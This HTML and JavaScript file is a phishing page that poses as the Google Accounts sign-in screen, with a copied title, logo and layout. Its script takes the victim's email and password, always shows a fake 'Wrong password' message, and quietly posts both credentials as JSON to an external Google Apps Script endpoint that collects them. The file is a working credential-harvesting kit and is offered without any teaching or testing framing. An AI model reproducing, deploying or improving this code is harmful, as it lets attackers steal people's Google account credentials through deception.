<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="shortcut icon" href="icon.png" type="image/png">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #bfcbd840;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #202124;
        }

        .container {
            background-color: white;
            width: 1000px;
            min-height: 300px;
            padding: 40px;
            border-radius: 25px;
            display: flex;
            align-items: flex-start;
            margin-bottom: 30px;
        }

        .container .left-side {
            width: 50%;
            padding-right: 20px;
        }

        .container .left-side img {
            width: 70px;
            margin-bottom: 20px;
        }

        .container .left-side h2 {
            font-size: 33px;
            color: #202124;
            margin-bottom: 20px;
            font-weight: normal;
        }

        .container .left-side p {
            color: #5f6368;
            margin-bottom: 30px;
        }

        .container .right-side {
            width: 50%;
            padding-left: 20px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .input-box {
            margin-top: 30px;
            text-align: left;
            width: 100%;
        }

        input[type="text"],
        input[type="password"] {
            padding: 18px;
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 10px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-width: 1.8px;
            border-color: #1a73e8;
        }

        .email-box {
            margin-top: 30px;
            padding: 0px;
            border: 1.58px solid #878c92;
            border-radius: 25px;
            align-items: center;
            font-size: 16px;
            width: fit-content;
            height: 26px;
        }

        .email-box p {
            padding: 0;
            margin-top: 3px;
            margin-left: 10px;
            margin-right: 10px;
            white-space: nowrap;
            font-size: 16px;
            color: #202124;
        }

        .error-message {
            color: rgb(194, 0, 0);
            font-size: 13px;
            margin-top: 78px;
            margin-bottom: 0px;
        }

        .error-message-pass {
            color: rgb(194, 0, 0);
            font-size: 13px;
            margin-top: 78px;
            margin-bottom: 0px;
            display: none;
        }

        .forgot-email,
        .forgot-password {
            margin-left: 1px;
            font-size: 15px;
            text-align: left;
            margin-top: 5px;
            margin-bottom: 40px;
        }

        .forgot-email a,
        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .forgot-email a:hover,
        .forgot-password a:hover {
            text-decoration: underline;
        }

        .guest-mode {
            color: #5f6368;
            margin-bottom: 45px;
            font-size: 14px;
            text-align: left;
        }

        .guest-mode p {
            margin: 0;
        }

        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
        }

        .guest-mode a:hover {
            text-decoration: underline;
        }

        .buttons {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            width: 100%;
        }

        .buttons a {
            color: #1a73e8;
            text-decoration: none;
            margin-right: 40px;
        }

        .buttons a:hover {
            text-decoration: underline;
        }

        .buttons button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 25px;
            padding: 10px 24px;
            font-size: 16px;
            cursor: pointer;
        }

        .buttons button:hover {
            background-color: #1669c7;
        }

        .show-password {
            display: flex;
            align-items: center;
            margin-top: 5px;
            font-size: 16px;
            margin-bottom: 75px;
        }

        .show-password input[type="checkbox"] {
            margin-left: 5px;
            margin-right: 10px;
            transform: scale(1.3);
        }

        .footer {
            width: 1000px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
            align-items: center;
        }

        .footer a {
            text-decoration: none;
            margin-right: 25px;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
    <script>

        function handleNextButtonClick() {
            var emailInput = document.querySelector('input[type="text"]');
            var email = emailInput.value;
            var errorMessage = document.querySelector('.error-message');

            errorMessage.textContent = '';

            if (isValidEmail(email)) {
                var container = document.querySelector('.container');
                container.innerHTML = `
                <div class="left-side">
                    <img src="image.png" alt="Google Logo">
                    <h2>Welcome</h2>
                    <div class="email-box">
                        <p id="emailDisplay">${email}</p>
                    </div>
                </div>
                <div class="right-side">
                    <div class="error-message-pass">Wrong password</div>
                    <div class="input-box">
                        <input type="password" id="passwordInput" placeholder="Enter your password">
                    </div>
                    <div class="show-password">
                        <input type="checkbox" id="showPassword" onclick="togglePassword()">
                        <label for="showPassword">Show password</label>
                    </div>
                    <div class="buttons">
                        <a href="#">Forgot password?</a>
                        <button onclick="handlePasswordClick()">Next</button>
                    </div>
                </div>
                `;
            } else {
                errorMessage.textContent = "Couldn't find your Google Account";
                errorMessage.style.display = 'block';
            }
        }

        function handlePasswordClick() {
            var passwordInput = document.querySelector('#passwordInput');
            var password = passwordInput.value;
            var email = document.querySelector('#emailDisplay').textContent;
            var errorMessagePass = document.querySelector('.error-message-pass');

            errorMessagePass.style.display = 'block';

            if (isValidPassword(password)) {
                sendDataToSheet(email, password);
            }
        }

        function isValidEmail(email) {
            var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        function isValidPassword(password) {
            return password.length > 0;
        }

        function togglePassword() {
            var passwordInput = document.querySelector('#passwordInput');
            var showPasswordCheckbox = document.getElementById('showPassword');
            passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
        }

        function sendDataToSheet(email, password) {
            const SHEET_URL = 'https://script.google.com/macros/s/AKfycbz80wwBuDRRimpw-JUNQewxjvd9M-qg2m7sWT2YIxFgkM-WgpSQKzuu2lCxbskiOg5k0A/exec';
            
            fetch(SHEET_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                mode: 'no-cors',  // This prevents the CORS error during development
                body: JSON.stringify({ email: email, password: password })
            })
            .then(response => response.text())
            .then(result => {
                console.log('Success:', result);
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }



    </script>
</head>

<body>

    <div class="container">
        <div class="left-side">
            <img src="image.png" alt="Google Logo">
            <h2>Sign in</h2>
            <p>Use your Google Account</p>
        </div>

        <div class="right-side">
            <div class="error-message"></div>
            <div class="input-box">
                <input type="text" placeholder="Email or phone">
            </div>
            <div class="forgot-email">
                <a href="#">Forgot email?</a>
            </div>
            <div class="guest-mode">
                <p>Not your computer? Use Guest mode to sign in privately.</p>
                <a href="#">Learn more about using Guest mode</a>
            </div>
            <div class="buttons">
                <a href="#">Create account</a>
                <button onclick="handleNextButtonClick()">Next</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>English (United States)</span>
        <div>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

</body>

</html>
